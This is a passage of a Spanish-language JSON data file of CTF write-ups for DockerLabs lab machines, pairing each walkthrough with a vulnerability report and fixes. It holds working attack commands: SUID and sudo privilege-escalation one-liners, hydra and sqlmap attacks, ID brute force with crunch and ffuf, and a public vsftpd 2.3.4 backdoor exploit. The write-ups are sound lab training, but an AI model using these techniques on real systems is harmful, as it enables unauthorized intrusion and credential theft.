          "Escalada a root por sudo NOPASSWD sobre /usr/bin/env",
          "CWE-250",
          "A05:2021 – Security Misconfiguration",
          "flynn puede ejecutar env como root sin contraseña; env lanza cualquier binario heredando ese contexto, dando una shell root directa (GTFOBins).",
          "Eliminar o restringir la regla sudo; nunca conceder NOPASSWD sobre binarios que pueden ejecutar otros programas (env, find, vim...)."
        ],
        [
          "ALTA",
          "Contraseña trivial (igual al nombre de usuario)",
          "CWE-521",
          "A07:2021 – Identification and Authentication Failures",
          "La cuenta flynn usa como contraseña su propio nombre, lo que permite el acceso por SSH de forma inmediata por fuerza bruta.",
          "Contraseñas robustas y distintas del usuario, bloqueo de intentos (fail2ban) y autenticación por clave."
        ],
        [
          "BAJA",
          "Divulgación del nombre de usuario en la web",
          "CWE-200",
          "A05:2021 – Security Misconfiguration",
          "El HTML de la portada muestra directamente un usuario válido (flynn), dando un objetivo inmediato para la fuerza bruta.",
          "No exponer nombres de usuario ni datos internos en el contenido público."
        ]
      ]
    },
    {
      "name": "Acme",
      "slug": "acme",
      "diff": "Muy fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "22/tcp (SSH), 80/tcp (HTTP)",
        "jumps": 2
      },
      "desc": "El banner del SSH filtra unas credenciales temporales en texto plano; con ellas accedo como 'usuario' y escalo a root abusando del bit SUID en /usr/bin/bash.",
      "tags": [
        "SSH",
        "Banner SSH",
        "Credenciales filtradas",
        "SUID",
        "GTFOBins"
      ],
      "body": [
        [
          "h",
          "Reconocimiento"
        ],
        [
          "c",
          "$ sudo nmap -p- -sS -sV --min-rate 5000 -n -Pn --open 172.17.0.2\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.16\n80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))"
        ],
        [
          "p",
          "La web del 80 es un portal de ACME Corporation 'en mantenimiento' que menciona que la administración se hace por SSH. Esa es la pista: el servidor SSH muestra un banner y conviene leerlo."
        ],
        [
          "h",
          "Credenciales en el banner SSH"
        ],
        [
          "p",
          "Un banner SSH es el mensaje que el servidor envía a cualquier cliente antes de pedir la contraseña. Suele usarse para avisos legales, pero aquí está mal configurado y filtra credenciales. Me conecto con cualquier nombre de usuario (da igual, el banner sale antes de autenticar)."
        ],
        [
          "c",
          "$ ssh usuario@172.17.0.2\n===================================================================\n[*] ACME Corporation - Nodo Bastion de Mantenimiento Interno\n[!] Credenciales temporales asignadas para tareas de mantenimiento:\n[!]   - Usuario: usuario\n[!]   - Password: P@ssw0rd2026_CTF!\n===================================================================\nusuario@172.17.0.2's password:"
        ],
        [
          "p",
          "El banner revela <strong>usuario : P@ssw0rd2026_CTF!</strong>, sin necesidad de autenticarse ni de tocar la web."
        ],
        [
          "h",
          "Acceso por SSH"
        ],
        [
          "c",
          "$ ssh usuario@172.17.0.2\nusuario@172.17.0.2's password: (P@ssw0rd2026_CTF!)\nWelcome to Ubuntu 22.04.5 LTS\n-bash-5.1$ whoami\nusuario"
        ],
        [
          "h",
          "Escalada a root · SUID"
        ],
        [
          "p",
          "usuario no tiene permisos de sudo, así que busco binarios con el bit SUID activado."
        ],
        [
          "c",
          "$ find / -perm -4000 -ls 2>/dev/null\n... /usr/bin/mount /usr/bin/su /usr/bin/passwd /usr/bin/sudo ...\n/usr/bin/dash\n/usr/bin/bash   <-- shell con SUID: abusable"
        ],
        [
          "n",
          "Tanto <code>bash</code> como <code>dash</code> tienen SUID de root. El flag <code>-p</code> le dice a la shell que no descarte el EUID heredado: como el binario es SUID de root, la shell resultante corre como root (GTFOBins)."
        ],
        [
          "c",
          "$ /usr/bin/bash -p\nbash-5.1# whoami\nroot"
        ],
        [
          "p",
          "Máquina Acme completada: <code>uid=0(root)</code>."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
          "Escalada a root por bit SUID en /usr/bin/bash",
          "CWE-250",
          "A05:2021 – Security Misconfiguration",
          "bash tiene el bit SUID de root: ejecutarlo con -p conserva los privilegios y da una shell root directa.",
          "Quitar el SUID (chmod u-s /usr/bin/bash) y auditar periódicamente los binarios con SUID."
        ],
        [
          "ALTA",
          "Credenciales filtradas en el banner SSH",
          "CWE-200",
          "A05:2021 – Security Misconfiguration",
          "El servidor muestra en el banner de bienvenida del SSH, antes de autenticarse, un usuario y una contraseña válidos en texto plano a cualquiera que se conecte.",
          "No incluir secretos en los banners (reservarlos para avisos legales) y entregar las credenciales por un canal seguro."
        ]
      ]
    },
    {
      "name": "TpRoot",
      "slug": "tproot",
      "diff": "Muy fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "21/tcp (FTP), 80/tcp (HTTP)",
        "jumps": 1
      },
      "desc": "El puerto FTP corre vsftpd 2.3.4, una versión con una puerta trasera conocida (CVE-2011-2523). La exploto con un exploit público de GitHub que da shell de root directa.",
      "tags": [
        "FTP",
        "vsftpd",
        "Backdoor",
        "CVE-2011-2523",
        "Exploit",
        "pwntools"
      ],
      "body": [
        [
          "h",
          "Reconocimiento"
        ],
        [
          "c",
          "$ sudo nmap -p- -sS -sCV --open -n -Pn 172.17.0.2\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.3.4\n80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))\n|_http-title: Apache2 Ubuntu Default Page: It works"
        ],
        [
          "p",
          "La web es la página por defecto de Apache (nada interesante). Lo que canta es el FTP: <strong>vsftpd 2.3.4</strong>, una versión con una backdoor histórica y muy conocida."
        ],
        [
          "h",
          "Explotación · backdoor de vsftpd 2.3.4"
        ],
        [
          "n",
          "En 2011 el código fuente de vsftpd 2.3.4 fue troyanizado: si en el login mandas un usuario terminado en <code>:)</code>, el servicio abre un shell de root escuchando en el puerto 6200 (CVE-2011-2523). Se puede explotar con Metasploit, pero para una máquina tan sencilla un exploit de GitHub es más directo y transparente."
        ],
        [
          "p",
          "Preparo un entorno virtual con pwntools, clono el exploit y lo lanzo contra el objetivo."
        ],
        [
          "c",
          "$ python3 -m venv venv && source venv/bin/activate\n$ pip install pwntools\n$ git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git\n$ cd vsftpd_2.3.4_Exploit && chmod +x exploit.py\n$ python3 exploit.py 172.17.0.2\n[+] Got Shell!!!\n[+] Opening connection to 172.17.0.2 on port 6200: Done\n[*] Switching to interactive mode\n$ whoami\nroot"
        ],
        [
          "p",
          "El exploit dispara la backdoor y me conecta al shell del puerto 6200, que ya es root: no hace falta escalar. Máquina TpRoot completada."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
          "Backdoor en vsftpd 2.3.4 (CVE-2011-2523)",
          "CWE-506",
          "A06:2021 – Vulnerable and Outdated Components",
          "Esta versión de vsftpd contiene una puerta trasera: enviar un usuario acabado en ':)' abre un shell de root en el puerto 6200, sin autenticación.",
          "Actualizar vsftpd a una versión parcheada y verificar la integridad del software instalado desde fuentes de confianza."
        ]
      ]
    },
    {
      "name": "Trust",
      "slug": "trust",
      "diff": "Muy fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "22/tcp (SSH), 80/tcp (HTTP)",
        "jumps": 2
      },
      "desc": "Un fichero oculto (secret.php) descubierto con gobuster filtra un usuario; con hydra saco su contraseña y escalo a root abusando de un permiso sudo sobre vim.",
      "tags": [
        "Gobuster",
        "Fuerza bruta SSH",
        "Hydra",
        "sudo",
        "Vim",
        "GTFOBins"
      ],
      "body": [
        [
          "h",
          "Reconocimiento"
        ],
        [
          "c",
          "$ sudo nmap -p- -sS -sCV --open -n -Pn 172.17.0.2\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2\n80/tcp open  http    Apache httpd 2.4.57 ((Debian))\n|_http-title: Apache2 Debian Default Page: It works"
        ],
        [
          "p",
          "La web es la página por defecto de Apache, así que fuzzeo en busca de recursos ocultos."
        ],
        [
          "h",
          "Enumeración web"
        ],
        [
          "c",
          "$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/big.txt -x html,php,txt -t 100\n/index.html           (Status: 200)\n/secret.php           (Status: 200)\n/server-status        (Status: 403)"
        ],
        [
          "p",
          "Aparece <code>secret.php</code>. Lo abro."
        ],
        [
          "c",
          "$ curl -s http://172.17.0.2/secret.php\nHola Mario,\nEsta web no se puede hackear."
        ],
        [
          "p",
          "Me da un nombre de usuario: <strong>mario</strong>."
        ],
        [
          "h",
          "Fuerza bruta del usuario mario"
        ],
        [
          "c",
          "$ hydra -l mario -P rockyou.txt ssh://172.17.0.2 -t 64\n[22][ssh] host: 172.17.0.2   login: mario   password: chocolate\n1 of 1 target successfully completed, 1 valid password found"
        ],
        [
          "p",
          "Entro por SSH con <strong>mario : chocolate</strong>."
        ],
        [
          "c",
          "$ ssh mario@172.17.0.2\nmario@172.17.0.2's password: (chocolate)\nmario@trust:~$ whoami\nmario"
        ],
        [
          "h",
          "Escalada a root · sudo Vim"
        ],
        [
          "c",
          "$ sudo -l\nUser mario may run the following commands on trust:\n    (ALL) /usr/bin/vim"
        ],
        [
          "p",
          "mario puede ejecutar <code>vim</code> como root. Según GTFOBins, desde el modo comando de Vim (<code>:!</code>) se puede lanzar una shell que hereda esos privilegios."
        ],
        [
          "c",
          "$ sudo vim -c ':!/bin/bash'\nroot@trust:/home/mario# whoami\nroot"
        ],
        [
          "p",
          "Máquina Trust completada: <code>uid=0(root)</code>."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
          "Escalada a root por sudo sobre Vim",
          "CWE-250",
          "A05:2021 – Security Misconfiguration",
          "mario puede ejecutar vim como root; desde su modo comando (:!) se lanza una shell y se escala a root (GTFOBins).",
          "Retirar vim de sudoers; si se necesita edición privilegiada, usar herramientas acotadas como sudoedit."
        ],
        [
          "ALTA",
          "Contraseña débil susceptible a fuerza bruta",
          "CWE-521",
          "A07:2021 – Identification and Authentication Failures",
          "La cuenta mario usa una contraseña de diccionario (chocolate), accesible por SSH mediante fuerza bruta.",
          "Contraseñas robustas, bloqueo de intentos (fail2ban) y autenticación por clave."
        ],
        [
          "BAJA",
          "Fichero oculto que divulga un usuario válido",
          "CWE-200",
          "A05:2021 – Security Misconfiguration",
          "El endpoint no enlazado secret.php deja ver el nombre de un usuario válido (mario), que sirve de objetivo para la fuerza bruta.",
          "No exponer información interna en ficheros accesibles; controlar el acceso a los recursos no públicos."
        ]
      ]
    },
    {
      "name": "Vacaciones",
      "slug": "vacaciones",
      "diff": "Muy fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "22/tcp (SSH), 80/tcp (HTTP)",
        "jumps": 3
      },
      "desc": "Un comentario en la web filtra dos usuarios; con hydra saco la contraseña de camilo, un correo interno revela la de juan y escalo a root abusando de un sudo NOPASSWD sobre ruby.",
      "tags": [
        "Hydra",
        "Fuerza bruta SSH",
        "rockyou",
        "Fuga de credenciales",
        "sudo",
        "Ruby",
        "GTFOBins"
      ],
      "body": [
        [
          "h",
          "Reconocimiento"
        ],
        [
          "c",
          "$ sudo nmap -p- -sS -sCV --open -n -Pn 172.17.0.2\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))"
        ],
        [
          "p",
          "La web no tiene contenido visible, pero en su código fuente hay un comentario revelador."
        ],
        [
          "c",
          "$ curl -s http://172.17.0.2 | grep \"<!--\"\n<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->"
        ],
        [
          "p",
          "Dos usuarios: <strong>juan</strong> y <strong>camilo</strong>. Voy a por sus contraseñas."
        ],
        [
          "h",
          "Fuerza bruta del usuario camilo"
        ],
        [
          "c",
          "$ hydra -l camilo -P rockyou.txt ssh://172.17.0.2 -t 64\n[22][ssh] host: 172.17.0.2   login: camilo   password: password1\n1 of 1 target successfully completed, 1 valid password found"
        ],
        [
          "p",
          "Entro por SSH con <strong>camilo : password1</strong>."
        ],
        [
          "c",
          "$ ssh camilo@172.17.0.2\ncamilo@172.17.0.2's password: (password1)\n$ whoami\ncamilo"
        ],
        [
          "h",
          "Pivote al usuario juan"
        ],
        [
          "p",
          "El comentario de la web hablaba de un correo. Lo busco en el buzón de camilo."
        ],
        [
          "c",
          "$ cat /var/mail/camilo/correo.txt\nHola Camilo,\n\nMe voy de vacaciones y no he terminado el trabajo que me dio el jefe.\nPor si acaso lo pide, aquí tienes la contraseña: 2k84dicb"
        ],
        [
          "p",
          "Esa contraseña es la de <strong>juan</strong> (el que se va de vacaciones). Pivoto a su cuenta."
        ],
        [
          "c",
          "$ ssh juan@172.17.0.2\njuan@172.17.0.2's password: (2k84dicb)\n$ whoami\njuan"
        ],
        [
          "h",
          "Escalada a root · sudo Ruby"
        ],
        [
          "c",
          "$ sudo -l\nUser juan may run the following commands on vacaciones:\n    (ALL) NOPASSWD: /usr/bin/ruby"
        ],
        [
          "p",
          "juan puede ejecutar <code>ruby</code> como root sin contraseña. Según GTFOBins, le pido a Ruby que lance una bash."
        ],
        [
          "c",
          "$ sudo ruby -e 'exec \"/bin/bash\"'\nroot@vacaciones:~# whoami\nroot"
        ],
        [
          "p",
          "Máquina Vacaciones completada: <code>uid=0(root)</code>."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
          "Escalada a root por sudo NOPASSWD sobre ruby",
          "CWE-250",
          "A05:2021 – Security Misconfiguration",
          "juan puede ejecutar ruby como root sin contraseña; un one-liner le da shell root (GTFOBins).",
          "Eliminar o restringir la regla sudo; nunca conceder NOPASSWD sobre intérpretes (ruby, python, perl...)."
        ],
        [
          "ALTA",
          "Contraseña débil susceptible a fuerza bruta",
          "CWE-521",
          "A07:2021 – Identification and Authentication Failures",
          "La cuenta camilo usa una contraseña de diccionario (password1), accesible por SSH mediante fuerza bruta.",
          "Contraseñas robustas, bloqueo de intentos (fail2ban) y autenticación por clave."
        ],
        [
          "MEDIA",
          "Contraseña compartida en texto plano por correo interno",
          "CWE-312",
          "A02:2021 – Cryptographic Failures",
          "Un correo en /var/mail/camilo guarda en claro la contraseña del usuario juan, permitiendo el pivote entre cuentas.",
          "Nunca compartir credenciales por correo o en texto plano; usar un gestor de secretos y forzar el cambio en el primer uso."
        ],
        [
          "BAJA",
          "Divulgación de usuarios en el código fuente de la web",
          "CWE-200",
          "A05:2021 – Security Misconfiguration",
          "Un comentario HTML deja ver los nombres de dos usuarios válidos (juan y camilo), que sirven de objetivo para la fuerza bruta.",
          "No dejar comentarios con información interna en el HTML que se sirve al público."
        ]
      ]
    },
    {
      "name": "Analyst",
      "slug": "analyst",
      "diff": "Fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "22/tcp (SSH), 80/tcp (HTTP)",
        "jumps": 1
      },
      "desc": "Análisis forense de red al estilo SOC: a partir de una captura PCAP reconstruyo toda la cadena de ataque —reconocimiento, bypass de subida por doble extensión, web shell, reverse shell y fuga de credenciales— con tshark, respondo las 9 preguntas del caso y termino escalando a root con la credencial filtrada.",
      "tags": [
        "Forense",
        "Wireshark",
        "tshark",
        "PCAP",
        "SOC",
        "Doble extensión",
        "sudo",
        "Blue Team"
      ],
      "body": [
        [
          "h",
          "El caso · ticket SOC"
        ],
        [
          "p",
          "Esta máquina es distinta: no se trata de vulnerar un servicio en vivo, sino de un análisis forense de red como los que se hacen en un SOC. La web del 80 me presenta un ticket de incidente —<strong>SOC-LAB // TICKET #PGN-2026-0417 · 'El caso de Pinguinito'</strong>— y dos evidencias para descargar: <code>incidente_pinguino.pcap</code> (la captura del segmento comprometido) y <code>threat_intel_feed.json</code> (un feed de threat intelligence con atribución de IPs). El objetivo es reconstruir la cadena de ataque desde el PCAP y responder 9 preguntas."
        ],
        [
          "n",
          "Las IPs del caso — Servidor víctima: 10.10.2.15 · Atacante real (Vietnam): 198.51.100.23 · Escáner / ruido de fondo (Alemania): 203.0.113.99 · Máquina DockerLabs (SSH final): 172.17.0.2."
        ],
        [
          "h",
          "Preparando el análisis · tshark"
        ],
        [
          "p",
          "Se puede abrir el .pcap con Wireshark, pero lo hago con tshark, que es el mismo motor por línea de comandos: perfecto para filtrar rápido, encadenar con grep/sort y dejar constancia reproducible."
        ],
        [
          "n",
          "tshark en 30 segundos — <code>-r fichero.pcap</code> lee una captura guardada · <code>-Y 'filtro'</code> aplica un filtro de visualización (misma sintaxis que Wireshark) · <code>-T fields -e campo</code> saca solo los campos que te interesan · <code>-z follow,tcp,ascii,N</code> reconstruye el contenido del flujo TCP nº N."
        ],
        [
          "h",
          "Q1 y Q2 · el origen del ataque"
        ],
        [
          "p",
          "El caso empieza por la subida del archivo malicioso, así que filtro las peticiones POST: son las que suben datos. Solo una IP las hace."
        ],
        [
          "c",
          "$ tshark -r incidente_pinguino.pcap -Y 'http.request.method==\"POST\"' -T fields -e ip.src -e http.request.uri\n198.51.100.23   /reviews/upload.php\n198.51.100.23   /reviews/upload.php"
        ],
        [
          "p",
          "Hay otras IPs en la captura (por ejemplo un escáner alemán), pero solo <strong>198.51.100.23</strong> llega a subir algo. Es el atacante real. Lo cruzo con el feed de threat intel."
        ],
        [
          "c",
          "$ jq '.entries[] | select(.ip==\"198.51.100.23\") | {ip, country, city}' threat_intel_feed.json\n{\n  \"ip\": \"198.51.100.23\",\n  \"country\": \"Vietnam\",\n  \"city\": \"Hanoi\"\n}"
        ],
        [
          "n",
          "Respuesta 1 — IP del atacante: 198.51.100.23. · Respuesta 2 — Atribución: Vietnam."
        ],
        [
          "h",
          "Q3 y Q4 · huella y endpoint"
        ],
        [
          "c",
          "$ tshark -r incidente_pinguino.pcap -Y 'ip.src==198.51.100.23 && http.request' -T fields -e http.user_agent | sort -u\nMozilla/5.0 (compatible; ReconBot/1.0; +http://lab.invalid/reconbot)"
        ],
        [
          "n",
          "Respuesta 3 — User-Agent: Mozilla/5.0 (compatible; ReconBot/1.0; +http://lab.invalid/reconbot). · Respuesta 4 — Endpoint de subida: /reviews/upload.php."
        ],
        [
          "h",
          "Q5 y Q6 · directorio y archivo malicioso"
        ],
        [
          "p",
          "Antes de subir nada, el atacante prueba varias rutas con GET hasta dar con el directorio de subidas real."
        ],
        [
          "c",
          "$ tshark -r incidente_pinguino.pcap -Y 'ip.src==198.51.100.23 && http.request.method==\"GET\"' -T fields -e http.request.uri\n/uploads/\n/images/uploads/\n/media/uploads/\n/reviews/uploads/\n/reviews/uploads/image.jpg.php?ip=198.51.100.23&port=8080"
        ],
        [
          "p",
          "La única ruta sobre la que el ataque continúa es <code>/reviews/uploads/</code> (devuelve 200 OK; las otras tres, 404). Ahí aparece subido y ejecutándose el archivo malicioso. Comparo los dos intentos de subida siguiendo sus flujos TCP."
        ],
        [
          "c",
          "$ tshark -r incidente_pinguino.pcap -q -z follow,tcp,ascii,10\nfilename=\"shell.php\"\n...\nHTTP/1.1 403 Forbidden\nTipo de archivo no permitido (extension .php bloqueada)\n\n$ tshark -r incidente_pinguino.pcap -q -z follow,tcp,ascii,11\nfilename=\"image.jpg.php\"\n...\nHTTP/1.1 200 OK\nArchivo subido correctamente: /reviews/uploads/image.jpg.php"
        ],
        [
          "n",
          "El bypass de doble extensión: el filtro rechaza <code>shell.php</code>, pero deja pasar <code>image.jpg.php</code> porque se fía del <code>.jpg</code> intermedio. Como Apache ejecuta cualquier fichero acabado en <code>.php</code>, el archivo se interpreta como código → web shell. · Respuesta 5 — /reviews/uploads/ · Respuesta 6 — image.jpg.php."
        ],
        [
          "h",
          "Q7, Q8 y Q9 · reverse shell y fuga de credenciales"
        ],
        [
          "p",
          "El web shell abre una conexión saliente desde el servidor hacia el atacante. La localizo buscando el SYN inicial que sale de la víctima."
        ],
        [
          "c",
          "$ tshark -r incidente_pinguino.pcap -Y 'ip.src==10.10.2.15 && ip.dst==198.51.100.23 && tcp.flags.syn==1 && tcp.flags.ack==0' -T fields -e tcp.dstport\n8080"
        ],
        [
          "p",
          "Sigo ese flujo TCP para leer la sesión de la shell inversa, donde quedan grabados los comandos del atacante."
        ],
        [
          "c",
          "$ tshark -r incidente_pinguino.pcap -q -z follow,tcp,ascii,13\nsudo -l\n    (ALL) NOPASSWD: /opt/scripts/reset_user_pass.sh\nsudo /opt/scripts/reset_user_pass.sh pinguinito\n[reset_user_pass] Nueva contrasena establecida: Tr0pic4l-Pingu_99!\ncat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\npinguinito:x:1001:1001:Pinguinito,,,:/home/pinguinito:/bin/bash"
        ],
        [
          "n",
          "Respuesta 7 — Puerto de la reverse shell: 8080. · Respuesta 8 — Fichero leído con cat: /etc/passwd. · Respuesta 9 — Usuario afectado: pinguinito (credencial filtrada: pinguinito : Tr0pic4l-Pingu_99!)."
        ],
        [
          "h",
          "Del análisis al root"
        ],
        [
          "p",
          "El forense me ha regalado unas credenciales válidas. Las uso para entrar de verdad en la máquina por SSH."
        ],
        [
          "c",
          "$ ssh pinguinito@172.17.0.2\npinguinito@172.17.0.2's password: (Tr0pic4l-Pingu_99!)\npinguinito@0e1369cb67ea:~$ sudo -l\nUser pinguinito may run the following commands:\n    (ALL) NOPASSWD: ALL"
        ],
        [
          "p",
          "<code>NOPASSWD: ALL</code> es la escalada más directa que existe: pinguinito puede ejecutar cualquier comando como root sin contraseña."
        ],
        [
          "c",
          "$ sudo su\nroot@0e1369cb67ea:/home/pinguinito# whoami\nroot"
        ],
        [
          "p",
          "Caso cerrado: cadena de ataque reconstruida y máquina comprometida como root."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
          "Subida de ficheros sin validar (bypass por doble extensión)",
          "CWE-434",
          "A04:2021 – Insecure Design",
          "El filtro de extensiones se salta con image.jpg.php; el atacante sube una web shell y consigue ejecución remota de código en el servidor.",
          "Validar el tipo real del fichero (magic bytes), usar lista blanca de extensiones, renombrar al guardar y no permitir ejecución en el directorio de subidas."
        ],
        [
          "CRÍTICA",
          "Escalada a root por sudo NOPASSWD sin restricción",
          "CWE-250",
          "A05:2021 – Security Misconfiguration",
          "www-data puede ejecutar un script privilegiado y el usuario pinguinito tiene NOPASSWD: ALL, lo que lleva a root de forma inmediata.",
          "Aplicar el principio de mínimo privilegio en sudoers; restringir comandos concretos y nunca conceder NOPASSWD: ALL."
        ],
        [
          "MEDIA",
          "Exposición de credenciales en texto claro",
          "CWE-312",
          "A02:2021 – Cryptographic Failures",
          "El script de mantenimiento imprime la nueva contraseña de pinguinito en claro, quedando visible en el tráfico/registros capturados.",
          "Nunca registrar ni mostrar secretos en stdout o logs; usar generación y entrega segura de credenciales y forzar su cambio en el primer uso."
        ]
      ]
    },
    {
      "name": "Duque",
      "slug": "duque",
      "diff": "Fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "22/tcp (SSH), 80/tcp (HTTP)",
        "jumps": 2
      },
      "desc": "Enumeración web con gobuster hasta un panel de facturación vulnerable a SQL injection, volcado de credenciales con sqlmap, fuerza bruta de un ID de factura con crunch + ffuf reutilizando la cookie de sesión, y escalada a root abusando del bit SUID en /usr/bin/env.",
      "tags": [
        "Gobuster",
        "SQLi",
        "sqlmap",
        "crunch",
        "ffuf",
        "Cookie de sesión",
        "SSH",
        "SUID",
        "GTFOBins"
      ],
      "body": [
        [
          "h",
          "Reconocimiento"
        ],
        [
          "c",
          "$ sudo nmap -p- -sS -sCV --open -n -Pn 172.17.0.2\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15\n80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\n|_http-title: NaturGas Solutions - Dashboard Corporativo"
        ],
        [
          "p",
          "Dos puertos: SSH (22) y un portal corporativo, NaturGas Solutions (80). El SSH sin credenciales no me sirve todavía, así que la vía es la web."
        ],
        [
          "h",
          "Enumeración web"
        ],
        [
          "c",
          "$ gobuster dir -u http://172.17.0.2 -w directory-list-2.3-medium.txt -x php,html,txt,sh -t 50\nindex.php            (Status: 200) [Size: 11622]\nintranet             (Status: 301)\nbills                (Status: 301)\nserver-status        (Status: 403)"
        ],
        [
          "p",
          "Aparecen <code>intranet</code> y, sobre todo, <code>bills</code> (facturas). Al entrar en <code>/bills/</code> me encuentro un panel de login: el objetivo perfecto para probar inyección SQL."
        ],
        [
          "h",
          "SQL Injection con sqlmap"
        ],
        [
          "p",
          "En vez de tantear la inyección a mano, le paso el formulario de login directamente a sqlmap con <code>--forms</code> (detecta y ataca los campos solo) y <code>--dbs</code> para listar las bases de datos."
        ],
        [
          "c",
          "$ sqlmap -u http://172.17.0.2/bills/index.php --forms --dbs --batch\nParameter: username (POST)\n    Type: time-based blind / UNION query (3 columns)\nback-end DBMS: MySQL >= 5.0.12 (MariaDB fork)\navailable databases [5]: information_schema, register, mysql, performance_schema, sys"
        ],
        [
          "p",
          "El campo <code>username</code> es inyectable. La base de datos interesante es <code>register</code>; vuelco su tabla <code>users</code>."
        ],
        [
          "c",
          "$ sqlmap -u http://172.17.0.2/bills/index.php -D register -T users --dump --forms --batch\n+----+-----------+----------+\n| id | passwd    | username |\n+----+-----------+----------+\n| 1  | mario123  | mario    |\n| 2  | jesus2026 | jesus    |\n| 3  | admin123  | admin    |\n+----+-----------+----------+"
        ],
        [
          "p",
          "Tres usuarios en claro. El que me interesa es <strong>admin : admin123</strong>, que me dará acceso al panel de administración."
        ],
        [
          "h",
          "Acceso al panel y facturas"
        ],
        [
          "p",
          "Inicio sesión en <code>/bills</code> como admin y entro al Panel de Gestión de Facturas. Cada factura se consulta con una URL del tipo <code>panel.php?id=xy****</code>: un prefijo fijo <code>xy</code> seguido de 4 caracteres. Existe una factura que no aparece en el listado y que guarda las credenciales del usuario <strong>duque</strong>. Voy a encontrar ese id por fuerza bruta."
        ],
        [
          "h",
          "Fuerza bruta del ID de factura · crunch + ffuf"
        ],
        [
          "n",
          "crunch genera diccionarios a partir de un patrón: <code>crunch 4 4 -t @%%%</code> → exactamente 4 caracteres, donde <code>@</code> es una letra minúscula y <code>%</code> un número. Así <code>@%%%</code> genera una letra + tres números (a000 … z999): 26 000 combinaciones, justo el formato del id."
        ],
        [
          "c",
          "$ crunch 4 4 -t @%%% | ffuf -c -w - -b \"PHPSESSID=02utmae17suvr9mpj4137arirc\" -u \"http://172.17.0.2/bills/panel.php?id=xyFUZZ\" --fw 2616,2715\nc724                    [Status: 200, Size: 5994, Words: 2624]\n:: Progress: [26000/26000] :: 224 req/sec :: Duration: [0:00:04]"
        ],
        [
          "n",
          "Los tres flags clave de ffuf: <code>-w -</code> lee el diccionario desde stdin (lo que va escupiendo crunch por la tubería) · <code>-b \"PHPSESSID=...\"</code> adjunta mi cookie de sesión de admin, porque panel.php solo muestra las facturas si vas autenticado · <code>--fw 2616,2715</code> descarta las respuestas de 'factura no encontrada' por número de palabras, dejando solo el acierto real."
        ],
        [
          "p",
          "ffuf devuelve un único resultado: <strong>c724</strong>. La factura es, por tanto, <code>xyc724</code>."
        ],
        [
          "h",
          "Credenciales de duque"
        ],
        [
          "p",
          "Abro esa factura en el navegador (ya logueado como admin) en <code>panel.php?id=xyc724</code>. El detalle de factura me muestra directamente el usuario y la contraseña de duque: <strong>duque : duquelaje81029557!</strong>. (Con curl a pelo sale vacío porque panel.php necesita la cookie de sesión.)"
        ],
        [
          "h",
          "Acceso por SSH"
        ],
        [
          "c",
          "$ ssh duque@172.17.0.2\nduque@172.17.0.2's password: (duquelaje81029557!)\nWelcome to Ubuntu 22.04.5 LTS\nduque@721b3e16b85a:~$"
        ],
        [
          "h",
          "Escalada a root · SUID"
        ],
        [
          "c",
          "$ find / -perm -4000 -ls 2>/dev/null\n... /usr/bin/mount /usr/bin/su /usr/bin/passwd /usr/bin/sudo ...\n1192985  44 -rwsr-xr-x  1 root root  43976  /usr/bin/env   <-- binario abusable"
        ],
        [
          "p",
          "<code>/usr/bin/env</code> aparece con SUID. Según GTFOBins, con ese bit puedo lanzar un shell que herede los privilegios del propietario (root). El flag <code>-p</code> evita que bash descarte el EUID heredado."
        ],
        [
          "c",
          "$ /usr/bin/env /bin/bash -p\nbash-5.1# whoami\nroot"
        ],
        [
          "p",
          "Máquina Duque completada: <code>uid=0(root)</code>."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
          "Escalada a root por bit SUID en /usr/bin/env",
          "CWE-250",
          "A05:2021 – Security Misconfiguration",
          "El binario env tiene el bit SUID de root: cualquier usuario local obtiene una shell como root en un solo paso.",
          "Quitar el SUID (chmod u-s /usr/bin/env), auditar periódicamente los binarios SUID y aplicar el principio de mínimo privilegio."
        ],
        [
          "ALTA",
          "Inyección SQL en el panel de login",
          "CWE-89",
          "A03:2021 – Injection",
          "El parámetro 'username' no se sanea, lo que permite saltarse el login y, con sqlmap, volcar la base de datos completa (todos los usuarios y contraseñas).",
          "Usar consultas parametrizadas (prepared statements) o un ORM; validar la entrada y aplicar el mínimo privilegio al usuario de base de datos."
        ],
        [
          "MEDIA",
          "Contraseñas almacenadas en texto plano",
          "CWE-256",
          "A02:2021 – Cryptographic Failures",
          "La tabla 'users' guarda las contraseñas en claro, así que al volcarla son directamente utilizables (mario123, admin123...).",
          "Almacenar solo hashes con un algoritmo lento y con sal (bcrypt, argon2), nunca la contraseña en claro."
        ],
        [
          "MEDIA",
          "Referencia directa insegura al ID de factura (IDOR)",
          "CWE-639",
          "A01:2021 – Broken Access Control",
          "panel.php?id= usa un identificador adivinable y sin control de propiedad; por fuerza bruta se accede a una factura ajena que expone credenciales en claro.",
          "Usar identificadores no predecibles (UUID), comprobar en el backend que la factura pertenece al usuario y no mostrar secretos en ella."
        ],
        [
          "MEDIA",
          "Reutilización de credenciales (web → SSH)",
          "CWE-521",
          "A07:2021 – Identification and Authentication Failures",
          "La contraseña obtenida por la web sirve tal cual para el acceso por SSH del usuario duque.",
